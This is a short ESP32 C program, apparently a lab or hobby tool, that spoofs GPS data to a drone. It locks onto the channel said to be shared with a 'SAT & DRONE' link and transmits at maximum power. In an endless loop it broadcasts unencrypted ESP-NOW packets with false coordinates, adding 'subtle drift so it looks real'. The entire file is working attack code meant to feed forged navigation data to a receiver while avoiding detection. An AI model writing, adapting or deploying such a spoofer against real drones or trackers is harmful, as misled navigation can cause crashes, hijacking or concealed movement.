#include <stdio.h>
#include <string.h>
#include "esp_wifi.h"
#include "esp_now.h"
#include "esp_log.h"
#include "nvs_flash.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

static const char *TAG = "GPS_SPOOFER";

typedef struct {
    float lat;
    float lon;
    float alt;
} gps_packet_t;

/* ---------------- SPOOFED COORDINATES ---------------- */
gps_packet_t spoof_data = {
    .lat = 28.613939,   // Delhi (clearly wrong vs Mumbai)
    .lon = 77.209023,
    .alt = 150.0
};
/* ----------------------------------------------------- */

void send_cb(const uint8_t *mac, esp_now_send_status_t status)
{
    ESP_LOGI(TAG, "Send status: %s",
             status == ESP_NOW_SEND_SUCCESS ? "SUCCESS" : "FAIL");
}

void app_main()
{
    ESP_ERROR_CHECK(nvs_flash_init());
    ESP_ERROR_CHECK(esp_netif_init());
    ESP_ERROR_CHECK(esp_event_loop_create_default());

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
    ESP_ERROR_CHECK(esp_wifi_start());

    /* -------- FORCE SAME CHANNEL AS SAT & DRONE -------- */
    ESP_ERROR_CHECK(esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE));
    ESP_LOGI(TAG, "Spoofer locked to channel 1");
    /* -------------------------------------------------- */

    /* -------- MAX TX POWER FOR STRONGER RSSI ---------- */
    esp_wifi_set_max_tx_power(84); // ~ +20 dBm
    /* -------------------------------------------------- */

    uint8_t mac[6];
    esp_wifi_get_mac(WIFI_IF_STA, mac);
    ESP_LOGI(TAG, "Spoofer MAC: %02X:%02X:%02X:%02X:%02X:%02X",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);

    ESP_ERROR_CHECK(esp_now_init());
    esp_now_register_send_cb(send_cb);

    /* ---------------- BROADCAST PEER ------------------ */
    esp_now_peer_info_t peer = {0};
    memcpy(peer.peer_addr, "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
    peer.ifidx = ESP_IF_WIFI_STA;
    peer.encrypt = false;

    esp_now_add_peer(&peer);
    /* -------------------------------------------------- */

    ESP_LOGI(TAG, "=== GPS SPOOFING STARTED ===");

    /* ---------------- SPOOF LOOP ---------------------- */
    while (1) {

        esp_now_send(peer.peer_addr,
                     (uint8_t *)&spoof_data,
                     sizeof(spoof_data));

        ESP_LOGW(TAG,
            "SPOOF TX → Lat %.6f | Lon %.6f | Alt %.1f",
            spoof_data.lat, spoof_data.lon, spoof_data.alt);

        /* subtle drift so it looks real */
        spoof_data.lat += 0.002f;
        spoof_data.lon -= 0.002f;

        vTaskDelay(800 / portTICK_PERIOD_MS);
    }
}
